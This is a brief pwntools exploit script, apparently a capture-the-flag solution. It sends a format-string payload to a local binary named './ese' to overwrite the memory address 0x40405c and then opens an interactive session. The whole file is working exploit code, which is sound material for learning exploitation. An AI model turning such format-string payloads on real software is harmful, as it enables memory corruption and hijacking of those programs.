from pwn import *

fname = './ese'

r = process(fname)
p = ELF(fname)

if __name__ == '__main__':
	context.clear(arch = 'amd64')
	
	target = 0x40405c
	mal_payload = fmtstr_payload(6,{target:0xaa})
	

	print(mal_payload)
	r.sendline(mal_payload)
	r.interactive()








